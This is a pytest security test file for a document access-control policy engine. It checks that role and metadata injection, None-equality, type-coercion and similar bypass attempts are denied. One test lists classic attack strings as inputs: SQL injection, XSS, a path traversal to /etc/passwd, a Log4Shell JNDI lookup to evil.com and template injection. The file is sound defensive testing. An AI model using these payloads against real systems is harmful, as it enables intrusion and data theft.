"""
Critical security tests to verify access control cannot be bypassed.

These tests are designed to catch security regressions and verify
that common attack patterns are blocked.
"""

from unittest.mock import MagicMock

import pytest


class TestRoleBasedSecurityEdgeCases:
    """Tests for role-based access control edge cases."""

    @pytest.fixture
    def policy_with_role_requirement(self):
        """Policy that requires admin role."""
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "admin_only",
                    "match": {"type": "admin"},
                    "allow": {"roles": ["admin"]}
                },
                {
                    "name": "user_docs",
                    "match": {"type": "user"},
                    "allow": {"roles": ["user", "admin"]}
                }
            ],
            "default": "deny"
        })

    @pytest.fixture
    def engine(self, policy_with_role_requirement):
        """Create policy engine."""
        from ragguard.policy.engine import PolicyEngine
        return PolicyEngine(policy_with_role_requirement)

    def test_empty_roles_list_denied(self, engine):
        """User with roles=[] should be denied by role-based rules."""
        user = {"id": "test", "roles": []}
        admin_doc = {"type": "admin"}
        user_doc = {"type": "user"}

        assert engine.evaluate(user, admin_doc) is False
        assert engine.evaluate(user, user_doc) is False

    def test_roles_none_denied(self, engine):
        """User with roles=None should be denied by role-based rules."""
        user = {"id": "test", "roles": None}
        admin_doc = {"type": "admin"}

        assert engine.evaluate(user, admin_doc) is False

    def test_missing_roles_field_denied(self, engine):
        """User without roles field should be denied by role-based rules."""
        user = {"id": "test"}  # No roles field at all
        admin_doc = {"type": "admin"}

        assert engine.evaluate(user, admin_doc) is False

    def test_roles_as_empty_string_denied(self, engine):
        """User with roles as empty string should be denied."""
        user = {"id": "test", "roles": ""}
        admin_doc = {"type": "admin"}

        assert engine.evaluate(user, admin_doc) is False

    def test_roles_with_whitespace_only_denied(self, engine):
        """User with whitespace-only role should be denied."""
        user = {"id": "test", "roles": ["   ", "\t", "\n"]}
        admin_doc = {"type": "admin"}

        # Whitespace roles should not match "admin"
        assert engine.evaluate(user, admin_doc) is False


class TestRoleInjectionAttacks:
    """Tests to verify role injection attacks are blocked."""

    @pytest.fixture
    def policy(self):
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "admin_rule",
                    "allow": {"roles": ["admin"]}
                }
            ],
            "default": "deny"
        })

    @pytest.fixture
    def engine(self, policy):
        from ragguard.policy.engine import PolicyEngine
        return PolicyEngine(policy)

    def test_dunder_roles_injection_blocked(self, engine):
        """User cannot inject roles via __roles__ field."""
        user = {
            "id": "attacker",
            "roles": ["user"],
            "__roles__": ["admin"]  # Attempted injection
        }
        doc = {"id": "doc1"}

        assert engine.evaluate(user, doc) is False

    def test_roles_array_injection_blocked(self, engine):
        """User cannot inject roles via _roles field."""
        user = {
            "id": "attacker",
            "roles": ["user"],
            "_roles": ["admin"]
        }
        doc = {"id": "doc1"}

        assert engine.evaluate(user, doc) is False

    def test_nested_roles_injection_blocked(self, engine):
        """User cannot inject roles via nested structure."""
        user = {
            "id": "attacker",
            "roles": ["user"],
            "user": {"roles": ["admin"]}  # Nested injection attempt
        }
        doc = {"id": "doc1"}

        assert engine.evaluate(user, doc) is False

    def test_prototype_pollution_style_injection_blocked(self, engine):
        """Prototype pollution style attacks should not work."""
        user = {
            "id": "attacker",
            "roles": ["user"],
            "__proto__": {"roles": ["admin"]},
            "constructor": {"prototype": {"roles": ["admin"]}}
        }
        doc = {"id": "doc1"}

        assert engine.evaluate(user, doc) is False


class TestDocumentMetadataInjection:
    """Tests to verify document metadata cannot bypass policy."""

    @pytest.fixture
    def policy(self):
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "public_only",
                    "match": {"visibility": "public"},
                    "allow": {"everyone": True}
                }
            ],
            "default": "deny"
        })

    @pytest.fixture
    def engine(self, policy):
        from ragguard.policy.engine import PolicyEngine
        return PolicyEngine(policy)

    def test_document_cannot_override_with_allow_everyone(self, engine):
        """Document cannot inject __allow_everyone__ to bypass policy."""
        user = {"id": "guest"}
        doc = {
            "visibility": "private",
            "__allow_everyone__": True  # Attempted bypass
        }

        assert engine.evaluate(user, doc) is False

    def test_document_cannot_override_with_everyone_field(self, engine):
        """Document cannot inject everyone field to bypass policy."""
        user = {"id": "guest"}
        doc = {
            "visibility": "private",
            "everyone": True
        }

        assert engine.evaluate(user, doc) is False

    def test_document_cannot_fake_visibility(self, engine):
        """Document cannot have conflicting visibility fields."""
        user = {"id": "guest"}
        doc = {
            "visibility": "private",
            "__visibility__": "public"  # Fake field
        }

        # Should use actual visibility field, not injected one
        assert engine.evaluate(user, doc) is False


class TestConditionBypassAttempts:
    """Tests for condition evaluation bypass attempts."""

    @pytest.fixture
    def policy(self):
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "dept_match",
                    "allow": {
                        "roles": ["user"],
                        "conditions": ["user.department == document.department"]
                    }
                }
            ],
            "default": "deny"
        })

    @pytest.fixture
    def engine(self, policy):
        from ragguard.policy.engine import PolicyEngine
        return PolicyEngine(policy)

    def test_none_equals_none_denied(self, engine):
        """None == None should NOT grant access (security critical)."""
        user = {"id": "test", "roles": ["user"]}  # No department
        doc = {}  # No department

        # Both have None department - should NOT match
        assert engine.evaluate(user, doc) is False

    def test_empty_string_not_equals_none(self, engine):
        """Empty string should not match None."""
        user = {"id": "test", "roles": ["user"], "department": ""}
        doc = {"department": None}

        assert engine.evaluate(user, doc) is False

    def test_whitespace_not_equals_value(self, engine):
        """Whitespace-only department should not match real value."""
        user = {"id": "test", "roles": ["user"], "department": "   "}
        doc = {"department": "engineering"}

        assert engine.evaluate(user, doc) is False

    def test_case_sensitivity_enforced(self, engine):
        """Department matching should be case-sensitive."""
        user = {"id": "test", "roles": ["user"], "department": "ENGINEERING"}
        doc = {"department": "engineering"}

        # Case mismatch - should deny
        assert engine.evaluate(user, doc) is False

    def test_type_coercion_blocked(self, engine):
        """Integer should not match string representation."""
        user = {"id": "test", "roles": ["user"], "department": 123}
        doc = {"department": "123"}

        # Different types - should deny
        assert engine.evaluate(user, doc) is False


class TestFilterDenyAllVerification:
    """Tests to verify deny-all filters are correctly identified."""

    @pytest.fixture
    def deny_policy(self):
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "admin_only",
                    "allow": {"roles": ["admin"]}
                }
            ],
            "default": "deny"
        })

    def test_unauthorized_user_gets_deny_all_filter(self, deny_policy):
        """Unauthorized user should receive a deny-all filter."""
        from ragguard.policy.engine import PolicyEngine, _is_deny_all_filter

        engine = PolicyEngine(deny_policy)
        user = {"id": "guest", "roles": ["guest"]}  # Not admin

        # Test various backends
        for backend in ["qdrant", "chromadb", "pinecone", "milvus"]:
            try:
                filter_obj = engine.to_filter(user, backend)
                # The filter should be a deny-all filter
                assert _is_deny_all_filter(filter_obj, backend), \
                    f"Backend {backend} should return deny-all filter for unauthorized user"
            except Exception:
                pass  # Some backends may not be available


class TestDefaultPolicyEnforcement:
    """Tests for default policy behavior."""

    def test_default_deny_when_no_rules_match(self):
        """When no rules match, default deny should block access."""
        from ragguard.policy.engine import PolicyEngine
        from ragguard.policy.models import Policy

        policy = Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "specific_rule",
                    "match": {"type": "special"},
                    "allow": {"everyone": True}
                }
            ],
            "default": "deny"
        })

        engine = PolicyEngine(policy)
        user = {"id": "anyone"}
        doc = {"type": "normal"}  # Doesn't match any rule

        assert engine.evaluate(user, doc) is False

    def test_default_deny_explicit_in_result(self):
        """Verify explanation shows default deny was applied."""
        from ragguard.policy.engine import PolicyEngine
        from ragguard.policy.models import Policy

        policy = Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "specific_rule",
                    "match": {"type": "special"},
                    "allow": {"everyone": True}
                }
            ],
            "default": "deny"
        })

        engine = PolicyEngine(policy)
        user = {"id": "anyone"}
        doc = {"type": "normal"}

        result = engine.evaluate_with_explanation(user, doc)

        assert result["decision"] == "deny"
        assert result["default_applied"] is True


class TestMaliciousInputHandling:
    """Tests for handling malicious input patterns."""

    @pytest.fixture
    def simple_policy(self):
        from ragguard.policy.models import Policy
        return Policy.from_dict({
            "version": "1",
            "rules": [
                {"name": "allow_users", "allow": {"roles": ["user"]}}
            ],
            "default": "deny"
        })

    @pytest.fixture
    def engine(self, simple_policy):
        from ragguard.policy.engine import PolicyEngine
        return PolicyEngine(simple_policy)

    def test_extremely_long_role_name(self, engine):
        """Very long role names should not crash or bypass security."""
        user = {"id": "test", "roles": ["a" * 10000]}
        doc = {"id": "doc1"}

        # Should not crash, should deny (role doesn't match "user")
        result = engine.evaluate(user, doc)
        assert result is False

    def test_null_bytes_in_role(self, engine):
        """Null bytes in role should not cause issues."""
        user = {"id": "test", "roles": ["user\x00admin"]}
        doc = {"id": "doc1"}

        # Should not match "user" exactly
        result = engine.evaluate(user, doc)
        assert result is False

    def test_unicode_normalization_attack(self, engine):
        """Unicode normalization attacks should not work."""
        # Using different Unicode representations of similar-looking characters
        user = {"id": "test", "roles": ["usеr"]}  # Cyrillic 'е' instead of Latin 'e'
        doc = {"id": "doc1"}

        # Should not match "user"
        result = engine.evaluate(user, doc)
        assert result is False

    def test_special_characters_in_user_id(self, engine):
        """Special characters in user_id should be handled safely."""
        special_ids = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{constructor.constructor('return this')()}}"
        ]

        for user_id in special_ids:
            user = {"id": user_id, "roles": ["user"]}
            doc = {"id": "doc1"}

            # Should not crash, should process normally
            result = engine.evaluate(user, doc)
            assert isinstance(result, bool)


class TestConcurrentAccessSafety:
    """Tests for thread safety of policy evaluation."""

    def test_policy_evaluation_thread_safe(self):
        """Policy evaluation should be thread-safe."""
        import threading
        import time

        from ragguard.policy.engine import PolicyEngine
        from ragguard.policy.models import Policy

        policy = Policy.from_dict({
            "version": "1",
            "rules": [
                {
                    "name": "dept_rule",
                    "allow": {
                        "roles": ["user"],
                        "conditions": ["user.department == document.department"]
                    }
                }
            ],
            "default": "deny"
        })

        engine = PolicyEngine(policy)
        results = []
        errors = []

        def evaluate_many(user_dept, doc_dept, expected):
            try:
                for _ in range(100):
                    user = {"id": "test", "roles": ["user"], "department": user_dept}
                    doc = {"department": doc_dept}
                    result = engine.evaluate(user, doc)
                    if result != expected:
                        errors.append(f"Expected {expected}, got {result}")
                results.append(True)
            except Exception as e:
                errors.append(str(e))

        threads = [
            threading.Thread(target=evaluate_many, args=("eng", "eng", True)),
            threading.Thread(target=evaluate_many, args=("eng", "sales", False)),
            threading.Thread(target=evaluate_many, args=("sales", "sales", True)),
            threading.Thread(target=evaluate_many, args=("hr", "eng", False)),
        ]

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0, f"Thread safety errors: {errors}"
        assert len(results) == 4
